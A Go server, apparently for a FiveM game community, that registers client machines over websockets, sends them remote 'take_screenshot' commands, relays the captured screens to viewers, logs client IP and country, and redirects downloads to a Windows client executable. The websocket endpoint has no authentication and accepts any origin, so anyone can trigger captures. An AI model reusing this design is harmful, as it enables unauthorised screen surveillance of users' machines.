package main

import (
	"bytes"
	"embed"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"text/template"
	"time"

	"github.com/gorilla/websocket"
)

//go:embed static/*
var staticFS embed.FS

var upgrader = websocket.Upgrader{
	// ReadBufferSize:  1024,
	// WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		// Allow all origins for simplicity in example.
		// In production, tighten this for security!
		// Example: return r.Host == "yourdomain.com" || r.Host == "www.yourdomain.com"
		return true
	},
}

var (
	wsConnections               = make(map[*websocket.Conn]bool)
	wsConnectionsMachineID      = make(map[string]*websocket.Conn)
	wsConnectionsMachineIDMutex = &sync.Mutex{}
	wsChannel                   = make(chan Message, 100)
)

type Message struct {
	Type int           `json:"type"`
	Data *bytes.Buffer `json:"data"`
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("failed to upgrade connection: %v", err)
		return
	}
	defer func() {
		delete(wsConnections, conn)
		_ = conn.Close()
	}()

	conn.SetPongHandler(func(appData string) error {
		return nil
	})

	go func() {
		for range time.Tick(5 * time.Second) {
			_ = conn.WriteMessage(websocket.PingMessage, []byte("ping"))
		}
	}()

	wsConnections[conn] = r.URL.Query().Get("b") == "true"
	log.Printf("Client connected from %s", r.RemoteAddr)

	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Error reading message: %v", err)
			break
		}

		if messageType == websocket.TextMessage && p != nil && string(p[:4]) == "ping" {
			if err := conn.WriteMessage(websocket.PongMessage, []byte("pong")); err != nil {
				log.Printf("Error writing pong message: %v", err)
				break
			}
			continue
		}

		// if messageType == websocket.TextMessage && p != nil {
		// 	log.Printf("Received message: %s", string(p))
		// }

		if messageType == websocket.TextMessage && p != nil && string(p[:10]) == "screenshot" {
			parts := strings.Split(string(p), " ")
			if len(parts) < 2 {
				_ = conn.WriteMessage(websocket.TextMessage, []byte("Invalid screenshot command"))
				continue
			}

			if parts[1][:3] == "all" {
				wsConnectionsMachineIDMutex.Lock()
				for machineID, targetConn := range wsConnectionsMachineID {
					if err := targetConn.WriteMessage(websocket.TextMessage, []byte("take_screenshot")); err != nil {
						log.Printf("Error sending screenshot command to machine ID %s: %v", machineID, err)
						_ = conn.WriteMessage(websocket.TextMessage, []byte("Failed to send screenshot command to machine ID "+machineID))
						continue
					}
					_ = conn.WriteMessage(websocket.TextMessage, []byte("Screenshot command sent to machine ID "+machineID))
				}
				wsConnectionsMachineIDMutex.Unlock()
				continue
			}

			if parts[1][:10] == "machine_id" {
				targetMachineID := parts[1][11:]
				wsConnectionsMachineIDMutex.Lock()
				targetConn, exists := wsConnectionsMachineID[targetMachineID]
				wsConnectionsMachineIDMutex.Unlock()
				if !exists {
					_ = conn.WriteMessage(websocket.TextMessage, []byte("Machine ID not found"))
					continue
				}
				if err := targetConn.WriteMessage(websocket.TextMessage, []byte("take_screenshot")); err != nil {
					log.Printf("Error sending screenshot command to machine ID %s: %v", targetMachineID, err)
					_ = conn.WriteMessage(websocket.TextMessage, []byte("Failed to send screenshot command"))
					continue
				}
				_ = conn.WriteMessage(websocket.TextMessage, []byte("Screenshot command sent to machine ID "+targetMachineID))
				continue
			}
		}

		if messageType == websocket.TextMessage {
			var data struct {
				Action    string `json:"action"`
				MachineID string `json:"machine_id"`
				Hostname  string `json:"hostname"`
				Username  string `json:"username"`

				Data  any    `json:"data"`
				Error string `json:"error"`
			}

			if err := json.Unmarshal(p, &data); err != nil {
				continue
			}

			if data.Action == "register" && data.MachineID != "" {
				wsConnectionsMachineIDMutex.Lock()
				wsConnectionsMachineID[data.MachineID] = conn
				wsConnectionsMachineIDMutex.Unlock()
				log.Printf("Registered machine ID: %s", data.MachineID)
				wsChannel <- Message{
					Type: websocket.TextMessage,
					Data: bytes.NewBufferString(fmt.Sprintf("Machine %s registered with hostname %s, username %s", data.MachineID, data.Hostname, data.Username)),
				}
			} else if data.Action == "unregister" && data.MachineID != "" {
				wsConnectionsMachineIDMutex.Lock()
				delete(wsConnectionsMachineID, data.MachineID)
				wsConnectionsMachineIDMutex.Unlock()
				log.Printf("Unregistered machine ID: %s", data.MachineID)
				wsChannel <- Message{
					Type: websocket.TextMessage,
					Data: bytes.NewBufferString(fmt.Sprintf("Machine %s unregistered", data.MachineID)),
				}
			} else if data.Action == "screenshot" {
				log.Printf("Received screenshot data from %s, %s, %s", data.MachineID, data.Hostname, data.Username)
				wsChannel <- Message{
					Type: websocket.TextMessage,
					Data: bytes.NewBuffer(p),
				}
			}
		}
	}

	log.Printf("Client disconnected from %s", r.RemoteAddr)
}

type Status struct {
	MachineID string `json:"machine_id"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	IP        string `json:"ip"`
	Country   string `json:"country"`
	From      string `json:"from"`
	Status    string `json:"status"`
	Version   string `json:"version"`

	Time time.Time `json:"time"`
}

func main() {
	status := make([]Status, 0)
	statusMu := &sync.Mutex{}

	go func() {
		for range time.Tick(4 * time.Hour) {
			statusMu.Lock()
			newStatus := make([]Status, 0)
			for _, s := range status {
				if time.Since(s.Time) < 24*time.Hour {
					newStatus = append(newStatus, s)
				}
			}
			status = newStatus
			statusMu.Unlock()
		}
	}()

	http.HandleFunc("/ws", wsHandler)

	http.HandleFunc("/chat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.WriteHeader(http.StatusOK)

		htmlContent, err := staticFS.ReadFile("static/index.html")
		if err != nil {
			http.Error(w, "failed to load index.html", http.StatusInternalServerError)
			return
		}

		_, _ = w.Write(htmlContent)
	})

	go func() {
		for msg := range wsChannel {
			for conn := range wsConnections {
				if !wsConnections[conn] {
					continue
				}
				if err := conn.WriteMessage(msg.Type, msg.Data.Bytes()); err != nil {
					log.Printf("Error sending message to client: %v", err)
				}
			}
		}
	}()

	http.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		statusMu.Lock()
		defer statusMu.Unlock()

		if r.Method == http.MethodPost {
			var newStatus Status
			defer func() { _ = r.Body.Close() }()
			if err := json.NewDecoder(r.Body).Decode(&newStatus); err != nil {
				hostname := r.Header.Get("Client-Hostname")
				log.Printf("[%v]: failed to decode request body: %v\n", hostname, err)
				http.Error(w, "Invalid request body", http.StatusBadRequest)
				return
			}
			newStatus.IP = r.Header.Get("Cf-Connecting-Ip")
			newStatus.Country = r.Header.Get("Cf-Ipcountry")
			newStatus.Time = time.Now()
			buf := bytes.NewBuffer(nil)
			if err := json.NewEncoder(buf).Encode(newStatus); err != nil {
				log.Printf("[%v]: failed to encode status data: %v\n", newStatus.Hostname, err)
				http.Error(w, "failed to encode status data", http.StatusInternalServerError)
				return
			}
			wsChannel <- Message{
				Type: websocket.TextMessage,
				Data: buf,
			}
			status = append(status, newStatus)
			w.WriteHeader(http.StatusCreated)
			return
		}

		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
	})

	http.HandleFunc("/get-status", func(w http.ResponseWriter, r *http.Request) {
		statusMu.Lock()
		defer statusMu.Unlock()

		var data struct {
			Items      []Status `json:"items"`
			TotalItems int      `json:"total_items"`
			Page       int      `json:"page"`
			PerPage    int      `json:"per_page"`
			Reversed   bool     `json:"reversed"`
		}

		data.Page = 1
		data.PerPage = 100
		data.Reversed = true

		if r.URL.Query().Get("page") != "" {
			page, err := strconv.Atoi(r.URL.Query().Get("page"))
			if err == nil && page > 0 {
				data.Page = page
			}
		}

		if r.URL.Query().Get("per_page") != "" {
			perPage, err := strconv.Atoi(r.URL.Query().Get("per_page"))
			if err == nil && perPage > 0 && perPage <= 100 {
				data.PerPage = perPage
			}
		}

		if r.URL.Query().Get("reversed") == "false" {
			data.Reversed = false
		}

		items := make([]Status, len(status))
		copy(items, status)

		if data.Reversed {
			for i, j := 0, len(items)-1; i < j; i, j = i+1, j-1 {
				items[i], items[j] = items[j], items[i]
			}
		}

		start := (data.Page - 1) * data.PerPage
		end := start + data.PerPage
		if start >= len(items) {
			data.Items = []Status{}
		} else if end > len(items) {
			data.Items = items[start:]
		} else {
			data.Items = items[start:end]
		}

		data.TotalItems = len(items)

		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Cache-Control", "max-age=0")
		if err := json.NewEncoder(w).Encode(data); err != nil {
			log.Printf("failed to encode status: %v\n", err)
			http.Error(w, "failed to encode status", http.StatusInternalServerError)
			return
		}
	})

	playerHtmlContent, _ := staticFS.ReadFile("static/players.html")
	playerTemplate, _ := template.New("players").Funcs(template.FuncMap{
		"json": func(v any) string {
			b, err := json.Marshal(v)
			if err != nil {
				log.Printf("failed to marshal JSON: %v", err)
				return "{}"
			}
			return string(b)
		},
	}).Parse(string(playerHtmlContent))

	http.HandleFunc("/players", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")

		playerData, err := GetPlayerData()
		data := map[string]any{"players": playerData, "error": err}

		if err := playerTemplate.Execute(w, data); err != nil {
			log.Printf("failed to execute template: %v", err)
			http.Error(w, "Failed to render players page", http.StatusInternalServerError)
			return
		}
	})

	var downloadURL string

	doGetDownloadURL := func() {
		resp, err := http.Get("https://api.github.com/repos/willywotz/fivem/releases/latest")
		if err != nil {
			log.Printf("failed to fetch latest release: %v", err)
			return
		}
		defer func() { _ = resp.Body.Close() }()

		if resp.StatusCode != http.StatusOK {
			log.Printf("Unexpected status code: %d", resp.StatusCode)
			return
		}

		var release struct {
			Assets []struct {
				Name string `json:"name"`
				URL  string `json:"browser_download_url"`
			} `json:"assets"`
		}

		if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
			log.Printf("failed to decode response: %v", err)
			return
		}

		for _, asset := range release.Assets {
			if asset.Name == "fivem-windows-amd64.exe" {
				downloadURL = asset.URL
				break
			}
		}
	}

	doGetDownloadURL()

	go func() {
		for range time.Tick(5 * time.Minute) {
			doGetDownloadURL()
		}
	}()

	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
		if downloadURL == "" {
			http.Error(w, "Download URL not available", http.StatusServiceUnavailable)
			return
		}

		w.WriteHeader(http.StatusFound)
		w.Header().Set("Location", downloadURL)
		s := fmt.Sprintf("<script>window.location.href = '%s';</script>", downloadURL)
		_, _ = w.Write([]byte(s))
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "Not Found", http.StatusNotFound)
	})

	log.Println("Starting server on :8080")
	log.Println(http.ListenAndServe(":8080", nil))
}

type Player struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
	Ping int    `json:"ping"`
}

var (
	playerData          []*Player
	playerDataError     error
	playerDataMu        sync.Mutex
	playerDataLastFetch time.Time
)

func GetPlayerData() ([]*Player, error) {
	playerDataMu.Lock()
	defer playerDataMu.Unlock()

	if playerData == nil {
		playerData = make([]*Player, 0)
		playerDataError = nil
		playerDataLastFetch = time.Time{}
	}

	if time.Since(playerDataLastFetch) < 15*time.Second {
		return playerData, playerDataError
	}

	defer func() {
		playerDataLastFetch = time.Now()
	}()

	url := "http://212.80.214.124:30120/players.json"
	resp, err := http.Get(url)
	if err != nil {
		playerDataError = fmt.Errorf("failed to fetch players: %w", err)
		return playerData, playerDataError
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		playerDataError = fmt.Errorf("failed to fetch players: unexpected status code %d", resp.StatusCode)
		return playerData, playerDataError
	}

	var players []*Player
	if err := json.NewDecoder(resp.Body).Decode(&players); err != nil {
		playerDataError = fmt.Errorf("failed to decode players response: %w", err)
		return playerData, playerDataError
	}

	if len(players) == 0 {
		playerDataError = fmt.Errorf("no players online")
		return playerData, playerDataError
	}

	playerData = make([]*Player, len(players))
	for i, p := range players {
		playerData[i] = &Player{
			ID:   p.ID,
			Name: p.Name,
			Ping: p.Ping,
		}
	}

	playerDataError = nil

	return playerData, nil
}
